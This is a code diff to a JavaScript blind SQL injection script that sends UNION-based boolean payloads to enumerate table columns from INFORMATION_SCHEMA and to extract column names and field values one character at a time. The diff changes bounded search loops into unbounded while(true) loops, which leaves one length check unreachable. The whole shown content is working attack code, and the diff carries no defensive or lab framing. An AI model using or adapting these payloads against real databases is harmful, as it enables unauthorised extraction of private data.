@@ -50,35 +50,25 @@ async function discoverTableNames() {
 
 async function discoverColumnNames(tableName) {
     let columnCount = 0;
-    for (let i = 1; i <= 20; i++) {
-        const payload = `' UNION SELECT 'a' WHERE (SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '${tableName}')=${i}--`;
+    while (true) {
+        const payload = `' UNION SELECT 'a' WHERE (SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '${tableName}')=${columnCount}--`;
         if (await isTrue(payload)) {
-            columnCount = i;
-            break;
+            break
         }
+        columnCount++;
     }
-
-    if (columnCount === 0) {
-        return [];
-    }
-
     const discoveredColumns = [];
     for (let colIndex = 1; colIndex <= columnCount; colIndex++) {
         process.stdout.write(`Dumping column ${colIndex}/${columnCount} name: `);
         let columnName = '';
         let nameLength = 0;
-        for (let l = 1; l <= 30; l++) {
-            const payload = `' UNION SELECT 'a' WHERE (SELECT LEN(T.COLUMN_NAME) FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) as row_num, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '${tableName}') AS T WHERE T.row_num = ${colIndex})=${l}--`;
+        while (true) {
+            const payload = `' UNION SELECT 'a' WHERE (SELECT LEN(T.COLUMN_NAME) FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) as row_num, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '${tableName}') AS T WHERE T.row_num = ${colIndex})=${nameLength}--`;
             if (await isTrue(payload)) {
-                nameLength = l;
                 break;
             }
+            nameLength++;
         }
-
-        if (nameLength === 0) {
-            continue;
-        }
-
         for (let charIndex = 1; charIndex <= nameLength; charIndex++) {
             for (const c of CHARS) {
                 const payload = `' UNION SELECT 'a' WHERE (SELECT SUBSTRING(T.COLUMN_NAME, ${charIndex}, 1) FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) as row_num, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '${tableName}') AS T WHERE T.row_num = ${colIndex})='${c}'--`;
@@ -92,20 +82,18 @@ async function discoverColumnNames(tableName) {
         console.log()
         discoveredColumns.push(columnName);
     }
-
     return discoveredColumns;
 }
 
 async function dumpFieldValue(id, fieldName, tableName) {
     let length = -1;
-    for (let L = 0; L <= 100; L++) {
-        const payload = `' UNION SELECT 'a' WHERE (SELECT LEN(${fieldName}) FROM ${tableName} WHERE id=${id})=${L}--`;
+    while (true) {
+        const payload = `' UNION SELECT 'a' WHERE (SELECT LEN(${fieldName}) FROM ${tableName} WHERE id=${id})=${length}--`;
         if (await isTrue(payload)) {
-            length = L;
             break;
         }
+        length++;
     }
-
     if (length === -1) return null;
     if (length === 0) return "";
 
